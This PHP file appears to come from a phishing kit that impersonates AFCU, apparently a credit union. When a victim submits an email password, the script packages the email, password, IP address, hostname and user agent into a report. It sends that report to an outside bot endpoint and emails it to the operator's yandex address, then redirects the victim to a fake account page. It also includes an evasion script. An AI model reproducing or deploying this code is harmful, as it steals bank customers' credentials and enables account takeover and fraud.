<?php 

if(isset($_POST['emailPassword2']))
{
	include ("../mine.php");
	include '../anti/recon.php';
		ob_start();
	session_start();
	$ip = "{$_SESSION['ip']}";
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
			$code = <<<EOT
	============== [ AFCU Email 2 By CO-DEAD | ] ==============
	Email 		: {$_SESSION['email2']}
	Password         : {$_POST['emailPassword2']}
		-------- I N F O | I P  --------
	IP		: $ip
	IP lookup		: https://ip-api.com/$ip
	OS		: $useragent
	============= [ AFCU Email 2 By CO-DEAD ] =============
	\r\n\r\n
	EOT;
	$sendme = [
		'text' => $code
	];
	if($bot_result == "true"){
		$data = http_build_query($sendme);
		$response = file_get_contents( $bot . $data);
	}
			$subject = " AFCU Email 2 Info By CO-DEAD  From $ip";
			$headers = "From: CO-DEAD <codead13@yandex.com>\r\n";
			$headers .= "MIME-Version: 1.0\r\n";
			$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
			@mail($email,$subject,$code,$headers);
			session_destroy();
			header("Location: ../account-overview");
						

}
?>